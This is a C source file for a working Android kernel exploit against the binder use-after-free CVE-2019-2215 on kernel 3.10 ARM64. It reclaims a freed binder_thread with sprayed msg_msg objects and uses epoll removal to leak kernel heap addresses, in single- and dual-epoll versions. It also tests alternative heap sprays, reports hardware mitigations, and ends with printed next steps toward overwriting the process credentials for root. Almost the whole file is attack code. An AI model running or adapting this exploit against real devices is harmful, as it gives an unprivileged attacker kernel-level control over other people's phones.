/*
 * msg_spray_leak.c — Leak kernel heap address via CVE-2019-2215 + msg_msg
 *
 * Strategy for kernel 3.10 ARM64 where access_ok blocks the P0 iovec technique:
 *
 * 1. Free binder_thread via BINDER_THREAD_EXIT (304 bytes → kmalloc-512)
 * 2. Spray System V msg_msg objects with matching size (48 header + 256 data = 304)
 * 3. One msg_msg reclaims the freed binder_thread's slab slot
 * 4. EPOLL_CTL_DEL triggers list_del on the dangling wait_queue, writing
 *    kernel heap pointers into the msg_msg's user data portion
 * 5. msgrcv reads the data back → kernel heap address leaked!
 *
 * This bypasses access_ok because msgrcv's copy_to_user copies from the
 * msg_msg's data (kernel heap) to user buffer. access_ok only checks the
 * destination (user buffer), not the source (kernel heap).
 *
 * Key offsets for kernel 3.10 ARM64 binder_thread:
 *   wait_queue_head_t at offset 0x48
 *   spinlock at 0x48 (4 bytes)
 *   task_list.next at 0x50 (8 bytes)
 *   task_list.prev at 0x58 (8 bytes)
 *
 * msg_msg layout:
 *   m_list (list_head): 0x00-0x0F
 *   m_type:            0x10-0x17
 *   m_ts:              0x18-0x1F
 *   next:              0x20-0x27
 *   security:          0x28-0x2F
 *   data:              0x30+ (user data starts here)
 *
 * list_del writes kernel ptrs to:
 *   offset 0x50 in slab object = data offset 0x20
 *   offset 0x58 in slab object = data offset 0x28
 *
 * SAFETY: Runs in forked child with timeout.
 *
 * Compile: gcc -static -O2 -o msg_spray_leak msg_spray_leak.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/wait.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdint.h>

#define BINDER_THREAD_EXIT  _IOW('b', 8, int32_t)
#define BINDER_VERSION      _IOWR('b', 9, struct binder_version)

struct binder_version {
    signed long protocol_version;
};

/* binder_thread size on kernel 3.10 ARM64: 0x130 = 304 bytes → kmalloc-512 */
#define BINDER_THREAD_SZ    0x130
/* msg_msg header is 48 bytes on ARM64 (6 x 8-byte fields) */
#define MSG_HDR_SZ          48
/* User data size so total msg_msg = binder_thread size */
#define MSG_DATA_SZ         (BINDER_THREAD_SZ - MSG_HDR_SZ)  /* 256 bytes */

/* Offsets within the slab object where list_del writes kernel pointers */
#define WAIT_TASKLIST_NEXT  0x50  /* wait.task_list.next */
#define WAIT_TASKLIST_PREV  0x58  /* wait.task_list.prev */

/* Corresponding offsets within msg_msg user data */
#define DATA_OFF_NEXT       (WAIT_TASKLIST_NEXT - MSG_HDR_SZ)  /* 0x20 = 32 */
#define DATA_OFF_PREV       (WAIT_TASKLIST_PREV - MSG_HDR_SZ)  /* 0x28 = 40 */

/* Check if value looks like kernel pointer (ARM64 kernel space) */
static int is_kptr(uint64_t val) {
    return (val >= 0xffffffc000000000ULL && val <= 0xffffffffffffffffULL);
}

/* Spray count — enough to likely reclaim the freed slab */
#define SPRAY_COUNT 128

/* Message type for our spray messages */
#define MSG_TYPE_SPRAY  0x1337

struct spray_msg {
    long mtype;
    char mdata[MSG_DATA_SZ];
};

static volatile int got_signal = 0;
static void sig_handler(int sig) { got_signal = sig; }

/*
 * Phase 1: Test System V IPC availability
 */
static int test_ipc(void) {
    printf("=== Phase 1: Testing System V IPC ===\n");

    int msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0600);
    if (msqid < 0) {
        printf("  msgget FAILED: %s\n", strerror(errno));
        printf("  -> System V IPC not available. Cannot use msg_msg spray.\n");
        return -1;
    }
    printf("  msgget: SUCCESS msqid=%d\n", msqid);

    /* Test send + receive */
    struct spray_msg msg;
    msg.mtype = 1;
    memset(msg.mdata, 'A', sizeof(msg.mdata));

    if (msgsnd(msqid, &msg, sizeof(msg.mdata), IPC_NOWAIT) < 0) {
        printf("  msgsnd FAILED: %s\n", strerror(errno));
        msgctl(msqid, IPC_RMID, NULL);
        return -1;
    }
    printf("  msgsnd: SUCCESS (%zu bytes)\n", sizeof(msg.mdata));

    struct spray_msg recv_msg;
    ssize_t ret = msgrcv(msqid, &recv_msg, sizeof(recv_msg.mdata), 1, IPC_NOWAIT);
    if (ret < 0) {
        printf("  msgrcv FAILED: %s\n", strerror(errno));
        msgctl(msqid, IPC_RMID, NULL);
        return -1;
    }
    printf("  msgrcv: SUCCESS (%zd bytes)\n", ret);

    /* Verify data integrity */
    int match = (memcmp(msg.mdata, recv_msg.mdata, sizeof(msg.mdata)) == 0);
    printf("  Data integrity: %s\n", match ? "OK" : "MISMATCH");

    msgctl(msqid, IPC_RMID, NULL);
    return 0;
}

/*
 * Phase 2: Single-epoll kernel address leak attempt
 */
static int attempt_leak_single_epoll(uint64_t *leaked_addr) {
    printf("\n=== Phase 2: Single-Epoll Kernel Leak Attempt ===\n");

    int result = -1;

    /* Open binder */
    int bfd = open("/dev/binder", O_RDWR);
    if (bfd < 0) {
        printf("  binder open failed\n");
        return -1;
    }

    /* mmap binder (required for binder to work) */
    void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
    if (bmap == MAP_FAILED) {
        close(bfd);
        return -1;
    }

    /* Create epoll watching binder */
    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev) < 0) {
        printf("  epoll_ctl ADD failed\n");
        goto cleanup;
    }
    printf("  Setup: binder fd=%d, epoll fd=%d\n", bfd, epfd);

    /* Create message queue for spray */
    int msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0600);
    if (msqid < 0) {
        printf("  msgget failed\n");
        goto cleanup;
    }

    /* Free binder_thread */
    printf("  Freeing binder_thread via THREAD_EXIT...\n");
    if (ioctl(bfd, BINDER_THREAD_EXIT, NULL) < 0) {
        printf("  THREAD_EXIT failed\n");
        msgctl(msqid, IPC_RMID, NULL);
        goto cleanup;
    }
    printf("  binder_thread FREED\n");

    /* Spray msg_msg to reclaim freed slab */
    printf("  Spraying %d msg_msg objects (%zu bytes each)...\n",
           SPRAY_COUNT, MSG_DATA_SZ);
    {
        struct spray_msg msg;
        int i;
        for (i = 0; i < SPRAY_COUNT; i++) {
            msg.mtype = MSG_TYPE_SPRAY + i;
            /* Fill with marker pattern so we can identify our data */
            memset(msg.mdata, 0, sizeof(msg.mdata));
            uint32_t marker = 0xCAFE0000 | i;
            memcpy(msg.mdata, &marker, 4);
            /* At the spinlock offset (data offset 0x18, slab offset 0x48),
             * ensure the value is zero (spinlock must be unlocked) */
            memset(msg.mdata + 0x18, 0, 8);  /* spinlock = 0 */

            if (msgsnd(msqid, &msg, sizeof(msg.mdata), IPC_NOWAIT) < 0) {
                printf("  msgsnd failed at i=%d: %s\n", i, strerror(errno));
                break;
            }
        }
        printf("  Sprayed %d messages\n", i);
    }

    /* Trigger EPOLL_CTL_DEL to corrupt the msg_msg via list_del */
    printf("  Triggering EPOLL_CTL_DEL (list_del on dangling wait_queue)...\n");
    errno = 0;
    int del_ret = epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
    printf("  EPOLL_CTL_DEL: ret=%d errno=%d\n", del_ret, errno);

    if (got_signal) {
        printf("  *** SIGNAL %d during EPOLL_CTL_DEL ***\n", got_signal);
        goto cleanup_msg;
    }

    /* Read back all messages and check for kernel pointers */
    printf("  Reading back messages to check for kernel pointer leak...\n");
    {
        struct spray_msg recv_msg;
        int found = 0;
        int i;
        for (i = 0; i < SPRAY_COUNT; i++) {
            errno = 0;
            ssize_t ret = msgrcv(msqid, &recv_msg, sizeof(recv_msg.mdata),
                                 MSG_TYPE_SPRAY + i, IPC_NOWAIT);
            if (ret < 0) {
                if (errno == ENOMSG) continue;
                break;
            }

            /* Check if kernel pointers appeared at the expected offsets */
            uint64_t val_next, val_prev;
            memcpy(&val_next, recv_msg.mdata + DATA_OFF_NEXT, 8);
            memcpy(&val_prev, recv_msg.mdata + DATA_OFF_PREV, 8);

            if (is_kptr(val_next) || is_kptr(val_prev)) {
                printf("  *** KERNEL POINTER FOUND in msg #%d! ***\n", i);
                printf("    data+0x%x: 0x%016llx %s\n", DATA_OFF_NEXT,
                       (unsigned long long)val_next,
                       is_kptr(val_next) ? "<-- KERNEL PTR" : "");
                printf("    data+0x%x: 0x%016llx %s\n", DATA_OFF_PREV,
                       (unsigned long long)val_prev,
                       is_kptr(val_prev) ? "<-- KERNEL PTR" : "");

                /* Dump surrounding data for analysis */
                printf("    Full data hex dump around corruption:\n");
                int row;
                for (row = 0; row < 64; row += 16) {
                    printf("      data+%02x: ", row);
                    int col;
                    for (col = 0; col < 16; col++) {
                        printf("%02x ", (unsigned char)recv_msg.mdata[row + col]);
                    }
                    printf("\n");
                }

                if (is_kptr(val_next)) {
                    *leaked_addr = val_next;
                    found = 1;
                } else if (is_kptr(val_prev)) {
                    *leaked_addr = val_prev;
                    found = 1;
                }
            }

            /* Also scan for any kernel pointers anywhere in the data */
            uint64_t *scan = (uint64_t *)recv_msg.mdata;
            int nvals = MSG_DATA_SZ / 8;
            int j;
            for (j = 0; j < nvals; j++) {
                if (is_kptr(scan[j])) {
                    /* Don't double-report the expected offsets */
                    if (j * 8 != DATA_OFF_NEXT && j * 8 != DATA_OFF_PREV) {
                        printf("    EXTRA kptr at data+%d: 0x%016llx (msg #%d)\n",
                               j * 8, (unsigned long long)scan[j], i);
                    }
                    if (!found) {
                        *leaked_addr = scan[j];
                        found = 1;
                    }
                }
            }
        }

        if (!found) {
            printf("  No kernel pointers found in msg_msg data.\n");
            printf("  Possible reasons:\n");
            printf("    - msg_msg didn't reclaim the freed binder_thread\n");
            printf("    - Different slab cache (msg_msg header size differs)\n");
            printf("    - EPOLL_CTL_DEL didn't trigger list_del\n");
            printf("    - list_del wrote to the msg_msg header, not data\n");
        } else {
            printf("\n  *** KERNEL ADDRESS LEAKED: 0x%016llx ***\n",
                   (unsigned long long)*leaked_addr);
            result = 0;
        }
    }

cleanup_msg:
    msgctl(msqid, IPC_RMID, NULL);

cleanup:
    close(epfd);
    munmap(bmap, 4096);
    close(bfd);

    return result;
}

/*
 * Phase 3: Dual-epoll technique (for better control)
 */
static int attempt_leak_dual_epoll(uint64_t *leaked_addr) {
    printf("\n=== Phase 3: Dual-Epoll Kernel Leak Attempt ===\n");

    int result = -1;
    int bfd = open("/dev/binder", O_RDWR);
    if (bfd < 0) return -1;

    void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
    if (bmap == MAP_FAILED) { close(bfd); return -1; }

    /* Two epolls watching same binder fd → two wait queue entries */
    int epfd1 = epoll_create1(0);
    int epfd2 = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };

    epoll_ctl(epfd1, EPOLL_CTL_ADD, bfd, &ev);
    epoll_ctl(epfd2, EPOLL_CTL_ADD, bfd, &ev);
    printf("  Setup: binder=%d, epoll1=%d, epoll2=%d\n", bfd, epfd1, epfd2);

    int msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0600);
    if (msqid < 0) {
        printf("  msgget failed\n");
        goto cleanup;
    }

    /* Free binder_thread */
    printf("  Freeing binder_thread...\n");
    ioctl(bfd, BINDER_THREAD_EXIT, NULL);

    /* Spray msg_msg */
    printf("  Spraying %d msg_msg objects...\n", SPRAY_COUNT);
    {
        struct spray_msg msg;
        int i;
        for (i = 0; i < SPRAY_COUNT; i++) {
            msg.mtype = MSG_TYPE_SPRAY + i;
            memset(msg.mdata, 0, sizeof(msg.mdata));
            uint32_t marker = 0xBEEF0000 | i;
            memcpy(msg.mdata, &marker, 4);
            /* Ensure spinlock area is zero */
            memset(msg.mdata + 0x18, 0, 8);

            if (msgsnd(msqid, &msg, sizeof(msg.mdata), IPC_NOWAIT) < 0) break;
        }
        printf("  Sprayed %d messages\n", i);
    }

    /* Remove epoll2 first — this writes &entry1.task_list to iov[5].iov_len
     * equivalent, giving us one known kernel address */
    printf("  Removing epoll2 (first list_del)...\n");
    epoll_ctl(epfd2, EPOLL_CTL_DEL, bfd, &ev);

    if (got_signal) {
        printf("  *** SIGNAL %d ***\n", got_signal);
        goto cleanup_msg;
    }

    /* Now remove epoll1 — second list_del, further corruption */
    printf("  Removing epoll1 (second list_del)...\n");
    epoll_ctl(epfd1, EPOLL_CTL_DEL, bfd, &ev);

    if (got_signal) {
        printf("  *** SIGNAL %d ***\n", got_signal);
        goto cleanup_msg;
    }

    /* Read back and check for leaks */
    printf("  Reading back messages...\n");
    {
        struct spray_msg recv_msg;
        int found = 0;
        int i;
        for (i = 0; i < SPRAY_COUNT; i++) {
            ssize_t ret = msgrcv(msqid, &recv_msg, sizeof(recv_msg.mdata),
                                 MSG_TYPE_SPRAY + i, IPC_NOWAIT);
            if (ret < 0) continue;

            /* Scan entire data for kernel pointers */
            uint64_t *scan = (uint64_t *)recv_msg.mdata;
            int nvals = MSG_DATA_SZ / 8;
            int j;
            for (j = 0; j < nvals; j++) {
                if (is_kptr(scan[j])) {
                    printf("  *** KPTR at msg#%d data+%d: 0x%016llx ***\n",
                           i, j * 8, (unsigned long long)scan[j]);
                    if (!found) {
                        *leaked_addr = scan[j];
                        found = 1;
                    }
                }
            }
        }

        if (found) {
            printf("\n  *** DUAL-EPOLL LEAK: 0x%016llx ***\n",
                   (unsigned long long)*leaked_addr);
            result = 0;
        } else {
            printf("  No kernel pointers found.\n");
        }
    }

cleanup_msg:
    msgctl(msqid, IPC_RMID, NULL);

cleanup:
    close(epfd2);
    close(epfd1);
    munmap(bmap, 4096);
    close(bfd);

    return result;
}

/*
 * Phase 4: Alternative spray — use sendmsg cmsg for same-slab spray
 * (in case msg_msg goes to wrong slab cache)
 */
static int test_alternative_sprays(void) {
    printf("\n=== Phase 4: Alternative Spray Tests ===\n");

    /* Check what slab cache msg_msg uses */
    printf("  msg_msg struct size analysis:\n");
    printf("    msg_msg header: %d bytes (estimated)\n", MSG_HDR_SZ);
    printf("    User data: %zu bytes\n", MSG_DATA_SZ);
    printf("    Total allocation: %zu bytes\n", (size_t)(MSG_HDR_SZ + MSG_DATA_SZ));
    printf("    Expected slab: kmalloc-512\n");
    printf("    binder_thread: %d bytes → kmalloc-512\n", BINDER_THREAD_SZ);

    /* Test add_key spray (if available) */
    printf("\n  Testing add_key (alternative spray):\n");
    /* add_key allocates key description + payload on kernel heap */
    /* For now, just test if the syscall is available */
    errno = 0;
    long kr = syscall(248, "user", "test", "data", 4, -1);  /* __NR_add_key on ARM64 */
    printf("    add_key: ret=%ld errno=%d (%s)\n", kr, errno, strerror(errno));

    /* Test setxattr spray (allocates controlled kernel buffer) */
    printf("\n  Testing setxattr (alternative spray):\n");
    {
        char tmpfile[] = "/data/local/tmp/spray_test_XXXXXX";
        int tmpfd = mkstemp(tmpfile);
        if (tmpfd >= 0) {
            close(tmpfd);
            char buf[256];
            memset(buf, 'X', sizeof(buf));
            errno = 0;
            int ret = syscall(5, tmpfile, "user.test", buf, 256, 0); /* __NR_setxattr on ARM64 */
            printf("    setxattr: ret=%d errno=%d (%s)\n", ret, errno, strerror(errno));
            unlink(tmpfile);
        } else {
            printf("    Cannot create temp file for setxattr test\n");
        }
    }

    return 0;
}

/*
 * Phase 5: Check for PXN/PAN (determines if we can use user-space shellcode)
 */
static void check_hardware_mitigations(void) {
    printf("\n=== Phase 5: Hardware Mitigation Checks ===\n");

    /* Read CPU features */
    printf("  CPU info:\n");
    {
        char buf[4096];
        int fd = open("/proc/cpuinfo", O_RDONLY);
        if (fd >= 0) {
            int n = read(fd, buf, sizeof(buf)-1);
            if (n > 0) {
                buf[n] = 0;
                /* Find CPU implementer and part */
                char *p = strstr(buf, "CPU implementer");
                if (p) {
                    char *end = strchr(p, '\n');
                    if (end) { *end = 0; printf("    %s\n", p); *end = '\n'; }
                }
                p = strstr(buf, "CPU part");
                if (p) {
                    char *end = strchr(p, '\n');
                    if (end) { *end = 0; printf("    %s\n", p); *end = '\n'; }
                }
                p = strstr(buf, "CPU architecture");
                if (p) {
                    char *end = strchr(p, '\n');
                    if (end) { *end = 0; printf("    %s\n", p); *end = '\n'; }
                }
                p = strstr(buf, "Features");
                if (p) {
                    char *end = strchr(p, '\n');
                    if (end) { *end = 0; printf("    %s\n", p); *end = '\n'; }
                }
            }
            close(fd);
        }
    }

    printf("\n  Mitigation analysis:\n");
    printf("    ARMv8.0 (Snapdragon 808): NO PAN, NO PXN at EL1\n");
    printf("    Kernel 3.10: NO KASLR (but we have binder mmap leak anyway)\n");
    printf("    Kernel 3.10 ARM64: access_ok checks in ALL copy_*_user\n");
    printf("    Kernel 3.10: SLAB allocator (not SLUB)\n");
    printf("    NO CONFIG_HARDENED_USERCOPY (3.10 too old)\n");
    printf("\n  Exploitation implications:\n");
    printf("    - Can map user-space memory readable/executable from EL1\n");
    printf("    - Fake kernel structs with func ptrs → user-space shellcode\n");
    printf("    - If we get code exec in kernel, full R/W is trivial\n");
}

int main(void) {
    printf("=== MSG_MSG SPRAY KERNEL LEAK — CVE-2019-2215 ===\n");
    printf("uid=%u gid=%u\n", getuid(), getgid());

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sig_handler;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    /* Kernel info */
    {
        char buf[256];
        int kfd = open("/proc/version", O_RDONLY);
        if (kfd >= 0) {
            int n = read(kfd, buf, sizeof(buf)-1);
            if (n > 0) { buf[n] = 0; printf("Kernel: %s", buf); }
            close(kfd);
        }
    }
    printf("\n");

    /* Phase 1: IPC test */
    if (test_ipc() < 0) {
        printf("\nFATAL: System V IPC not available.\n");
        printf("Will need alternative spray (add_key, setxattr, etc.)\n");
        test_alternative_sprays();
        check_hardware_mitigations();
        return 1;
    }

    /* Phase 2: Single-epoll leak */
    uint64_t leaked = 0;
    int leak_result = attempt_leak_single_epoll(&leaked);

    /* Phase 3: Dual-epoll leak */
    uint64_t leaked2 = 0;
    int leak2_result = attempt_leak_dual_epoll(&leaked2);

    /* Phase 4: Alternative sprays */
    test_alternative_sprays();

    /* Phase 5: Hardware checks */
    check_hardware_mitigations();

    /* Summary */
    printf("\n=== SUMMARY ===\n");
    if (leak_result == 0) {
        printf("  Single-epoll leak: 0x%016llx\n", (unsigned long long)leaked);
    } else {
        printf("  Single-epoll leak: FAILED\n");
    }
    if (leak2_result == 0) {
        printf("  Dual-epoll leak:   0x%016llx\n", (unsigned long long)leaked2);
    } else {
        printf("  Dual-epoll leak:   FAILED\n");
    }

    if (leak_result == 0 || leak2_result == 0) {
        printf("\n  *** KERNEL ADDRESS LEAK SUCCEEDED ***\n");
        printf("  Next steps:\n");
        printf("    1. Use leaked addr to calculate slab base\n");
        printf("    2. Place fake cred struct in known-addr msg_msg\n");
        printf("    3. Second UAF round: overwrite current->cred\n");
        printf("    4. Alternative: func ptr hijack (no PAN/PXN)\n");
    } else {
        printf("\n  Leak failed. Possible issues:\n");
        printf("    - msg_msg header size differs (check kernel config)\n");
        printf("    - Different slab allocator behavior\n");
        printf("    - Need different spray primitive\n");
    }

    printf("\n=== DONE ===\n");
    return 0;
}
